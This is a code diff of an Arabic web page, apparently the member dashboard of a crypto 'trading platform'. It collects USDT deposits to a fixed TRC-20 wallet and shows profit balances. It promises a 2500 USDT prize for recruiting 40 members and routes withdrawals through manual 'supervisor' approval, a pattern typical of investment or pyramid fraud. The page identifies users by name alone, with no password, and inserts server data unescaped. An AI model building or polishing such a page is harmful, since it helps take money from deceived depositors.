@@ -1,92 +1,155 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar" dir="rtl" class="notranslate" translate="no">
 <head>
     <meta charset="UTF-8">
+    <meta name="google" content="notranslate">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة التداول الذكية - حساب المشترك</title>
-    <link rel="stylesheet" href="https://cloudflare.com">
-    <link href="https://googleapis.com" rel="stylesheet">
+    <title>حساب العضو</title>
+    <link rel="manifest" href="/manifest.json">
     <style>
-        body { font-family: 'Tajawal', sans-serif; background-color: #0b0f19; color: #f3f4f6; }
+        body { background-color: #0b0f19; color: #fff; font-family: sans-serif; padding: 15px; }
+        .card { background-color: #151d30; padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #233253; }
+        input, button { width: 100%; padding: 10px; margin-top: 5px; box-sizing: border-box; border-radius: 5px; border: none; font-weight: bold; }
+        input { background: #0b0f19; color: white; border: 1px solid #233253; }
+        .btn-g { background: #28a745; color: white; cursor: pointer; }
+        .btn-p { background: #6f42c1; color: white; cursor: pointer; }
+        .btn-o { background: #fd7e14; color: white; cursor: pointer; }
+        .btn-r { background: #dc3545; color: white; width: 48%; margin: 1%; display: inline-block; cursor: pointer; }
+        .btn-blue { background: #0088cc; color: white; cursor: pointer; margin-top: 5px; }
+        .val { font-size: 20px; color: #4e97ff; margin-top: 5px; font-weight: bold; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
+        th, td { padding: 8px; border: 1px solid #233253; text-align: center; }
+        th { background: #1f2b45; color: #4e97ff; }
     </style>
 </head>
-<body class="p-4 bg-gray-900">
+<body>
+    <div class="card">
+        <span>👤 اسم المستخدم الحالي:</span>
+        <input type="text" id="userInput" placeholder="اكتب اسمك بالإنجليزية (مثال: user1)">
+        <button class="btn-g" id="saveBtn" onclick="saveUser()">💾 تثبيت الاسم وتفعيل الحساب</button>
+    </div>
+    <div class="card">
+        <span style="color:#ffc107;">🏆 الجائزة الكبرى (40 عضو):</span>
+        <div class="val">USDT 2500</div>
+        <p id="team">أعضاء فريقك: 0 / 40</p>
+    </div>
+    <div class="card">
+        <span>🔗 تقديم طلب مكافأة دعوة:</span>
+        <input type="text" id="invInput" placeholder="اسم العضو المدعو">
+        <button class="btn-p" onclick="sendBonus()">🎁 تقديم الطلب للمشرف</button>
+    </div>
+    <div class="card"><span>💰 رأس المال الكلي:</span><div class="val" id="b1">USDT 0.00</div></div>
+    <div class="card"><span>📈 أرباح اليوم:</span><div class="val" id="b2">USDT 0.00</div></div>
+    <div class="card"><span>👥 أرباح الدعوة:</span><div class="val" id="b3">USDT 0.00</div></div>
+    
+    <div class="card" style="border-color:#dc3545;">
+        <span style="color:#ffc107;">🚨 لوحة عمليات السحب الفورية والآمنة (شبكة TRC-20 حصراً):</span>
+        <input type="number" id="wAmt" placeholder="المبلغ بـ USDT">
+        <input type="text" id="wWal" placeholder="أدخل عنوان محفظتك الشخصية لشبكة TRC-20">
+        <button class="btn-r" onclick="withdraw('balance')">سحب كلي</button>
+        <button class="btn-r" onclick="withdraw('today')">سحب اليوم</button>
+        <button class="btn-p" style="margin-top:5px;" onclick="withdraw('referral')">سحب أرباح الدعوة</button>
+        
+        <p style="margin-top: 15px; font-size: 13px; color: #ffc107;">📊 إشعارات وحالة طلبات السحب الأخيرة:</p>
+        <table>
+            <thead>
+                <tr><th>المبلغ</th><th>النوع</th><th>التاريخ والوقت</th><th>الحالة</th></tr>
+            </thead>
+            <tbody id="withdrawHistory">
+                <tr><td colspan="4">لا توجد طلبات سحب حالية</td></tr>
+            </tbody>
+        </table>
+    </div>
 
-    <div class="max-w-md mx-auto space-y-6 mt-4">
-        <!-- الرصيد المباشر -->
-        <div class="bg-gray-800 p-6 rounded-2xl border border-gray-700 shadow-xl text-center">
-            <h1 class="text-xl font-bold text-blue-400 mb-2">🚀 مرحباً بك في منصة التداول</h1>
-            <p class="text-gray-400 text-sm">رصيدك الحالي المحدث حياً:</p>
-            <div class="text-3xl font-extrabold text-green-400 mt-1" id="userBalance">0.00 USDT</div>
-            <div class="inline-block mt-3 px-3 py-1 bg-gray-700 text-xs rounded-full text-yellow-400">🤖 البوت: مستعد للإيداع</div>
-        </div>
+    <div class="card" style="border-color:#fd7e14;">
+        <span>📥 طلب إيداع رأس المال (الشبكة: USDT TRC-20):</span>
+        <input type="text" id="walletAddr" value="TA1vsqrJFFy3YV6rkQWBppnZemFF6c9pDN" readonly style="color:#ffc107; text-align:center; font-weight:bold; cursor:pointer;">
+        <button class="btn-blue" onclick="copyWallet()">📋 نسخ عنوان المحفظة (TRC-20) تلقائياً</button>
+        <input type="number" id="dAmt" placeholder="أدخل المبلغ بعد التحويل (مثال: 100)">
+        <button class="btn-o" onclick="deposit()">⚡ إرسال طلب الإيداع للمشرف</button>
+    </div>
 
-        <!-- صندوق الإيداع وعرض المحفظة -->
-        <div class="bg-gray-800 p-6 rounded-2xl border border-gray-700 shadow-xl">
-            <h2 class="text-lg font-bold text-yellow-500 mb-4">💰 طلب تفعيل وإيداع رصيد</h2>
-            
-            <div class="bg-gray-900 p-3 rounded-xl border border-gray-700 mb-4 text-center">
-                <p class="text-xs text-gray-400 mb-1">عنوان محفظة الشركة الرسمي (USDT TRC-20):</p>
-                <div class="bg-black p-2 rounded-lg text-xs font-mono text-yellow-400 break-all select-all">
-                    TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN
-                </div>
-            </div>
-
-            <p class="text-xs text-gray-400 mb-4">تنبيّه: الحد الأدنى للإيداع هو <span class="text-yellow-500 font-bold">100 USDT</span>.</p>
-            
-            <div class="space-y-3">
-                <input type="text" id="depUsername" placeholder="اسم المستخدم الخاص بك" class="w-full bg-gray-900 border border-gray-700 rounded-xl p-3 text-white text-sm focus:outline-none">
-                <input type="number" id="depAmount" placeholder="المبلغ المحول (USDT)" class="w-full bg-gray-900 border border-gray-700 rounded-xl p-3 text-white text-sm focus:outline-none">
-                <input type="text" id="depAddress" placeholder="عنوان محفظتك الشخصية" class="w-full bg-gray-900 border border-gray-700 rounded-xl p-3 text-white text-sm focus:outline-none">
-                <button onclick="sendDeposit()" class="w-full bg-yellow-500 text-black font-bold p-3 rounded-xl">إرسال طلب الإيداع للمراجعة</button>
-            </div>
-            <div id="depMessage" class="text-xs mt-3 text-center font-bold"></div>
-        </div>
+    <div class="card" style="border-color:#0088cc;">
+        <a href="https://t.me" target="_blank" style="color:white; text-decoration:none; text-align:center; display:block;">✈️ تواصل مع الدعم الفني عبر تليجرام</a>
     </div>
 
     <script>
-        const BACKEND_URL = "https://onrender.com"; 
+        var user = localStorage.getItem('uname') || '';
+        var updateInterval = null;
 
-        async function sendDeposit() {
-            const username = document.getElementById('depUsername').value;
-            const amount = document.getElementById('depAmount').value;
-            const cryptoAddress = document.getElementById('depAddress').value;
-            const msgDiv = document.getElementById('depMessage');
-
-            if(!username || !amount || !cryptoAddress) {
-                msgDiv.className = "text-xs mt-3 text-red-400";
-                msgDiv.innerText = "❌ يرجى ملء جميع الحقول أولاً!";
-                return;
+        if(user) { 
+            document.getElementById('userInput').value = user; 
+            document.getElementById('userInput').disabled = true;
+            document.getElementById('saveBtn').style.display = 'none';
+            update(); 
+            updateInterval = setInterval(update, 3000);
+        }
+        
+        function saveUser() {
+            var v = document.getElementById('userInput').value.trim().toLowerCase();
+            if(!v) { alert('الرجاء كتابة الاسم أولاً'); return; }
+            user = v; 
+            localStorage.setItem('uname', user); 
+            document.getElementById('userInput').disabled = true;
+            document.getElementById('saveBtn').style.display = 'none';
+            update(); 
+            if(!updateInterval) {
+                updateInterval = setInterval(update, 3000);
             }
+            alert('تم تثبيت الاسم بنجاح وقفل الحساب ضد التلاعب!');
+        }
 
-            if(Number(amount) < 100) {
-                msgDiv.className = "text-xs mt-3 text-red-400";
-                msgDiv.innerText = "❌ فشل: الحد الأدنى للإيداع هو 100 USDT!";
-                return;
-            }
+        function copyWallet() {
+            var copyText = document.getElementById("walletAddr");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value);
+            alert("تم نسخ محفظة الإيداع شبكة (TRC-20) بنجاح: " + copyText.value);
+        }
 
-            msgDiv.className = "text-xs mt-3 text-blue-400";
-            msgDiv.innerText = "جاري إرسال البيانات بشكل آمن للسيرفر...";
-
+        async function update() {
+            if(!user) return;
             try {
-                const response = await fetch(`${BACKEND_URL}/api/finance/deposit`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, amount, cryptoAddress })
-                });
-                const data = await response.json();
+                var res = await fetch('/api/user/' + user);
+                var d = await res.json();
+                document.getElementById('b1').textContent = 'USDT ' + d.balance.toFixed(2);
+                document.getElementById('b2').textContent = 'USDT ' + d.todayProfit.toFixed(2);
+                document.getElementById('b3').textContent = 'USDT ' + d.referralProfit.toFixed(2);
+                document.getElementById('team').textContent = d.hasGrandPrize ? '🎉 مبروك الجائزة الكبرى!' : 'أعضاء فريقك: ' + d.teamCount + ' / 40';
                 
-                if(response.ok) {
-                    msgDiv.className = "text-xs mt-3 text-green-400";
-                    msgDiv.innerText = "✅ " + data.message;
+                var wRes = await fetch('/api/user/' + user + '/withdrawals');
+                var wData = await wRes.json();
+                var wBox = document.getElementById('withdrawHistory');
+                wBox.innerHTML = '';
+                if(wData.length === 0) {
+                    wBox.innerHTML = '<tr><td colspan="4">لا توجد طلبات سحب حالية</td></tr>';
                 } else {
-                    msgDiv.className = "text-xs mt-3 text-red-400";
-                    msgDiv.innerText = "❌ " + data.error;
+                    wData.forEach(function(h) {
+                        var wType = h.type === 'balance' ? 'كلي' : h.type === 'today' ? 'أرباح اليوم' : 'أرباح دعوة';
+                        var statusText = h.status === 'pending' ? 'معلق' : h.status === 'approved' ? 'مقبول' : 'مرفوض';
+                        var sColor = h.status === 'pending' ? '#fd7e14' : h.status === 'approved' ? '#28a745' : '#dc3545';
+                        wBox.innerHTML += '<tr><td>' + h.amount + ' USDT</td><td>' + wType + '</td><td>' + h.date + '</td><td style="color:' + sColor + '; font-weight:bold;">' + statusText + '</td></tr>';
+                    });
                 }
-            } catch(err) {
-                msgDiv.className = "text-xs mt-3 text-red-400";
-                msgDiv.innerText = "❌ فشل الاتصال بالسيرفر المركزي الحي.";
-            }
+            } catch(e) { console.error(e); }
+        }
+
+        async function deposit() {
+            var amt = document.getElementById('dAmt').value; if(!amt || !user) return;
+            var res = await fetch('/api/deposit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username: user, amount: amt, wallet: 'TA1vsqrJFFy3YV6rkQWBppnZemFF6c9pDN'}) });
+            var d = await res.json(); alert(d.message); document.getElementById('dAmt').value = ''; update();
+        }
+
+        async function withdraw(type) {
+            var amt = document.getElementById('wAmt').value; var wal = document.getElementById('wWal').value; if(!amt || !wal || !user) return;
+            var res = await fetch('/api/withdraw', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username: user, amount: amt, wallet: wal, type: type}) });
+            var d = await res.json(); alert(d.message); document.getElementById('wAmt').value = ''; document.getElementById('wWal').value = ''; update();
+        }
+
+        async function sendBonus() {
+            var inv = document.getElementById('invInput').value; if(!inv || !user) return;
+            var res = await fetch('/api/referral-bonus', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username: user, invitedUser: inv}) });
+            var d = await res.json(); alert(d.message); document.getElementById('invInput').value = ''; update();
         }
     </script>
 </body>
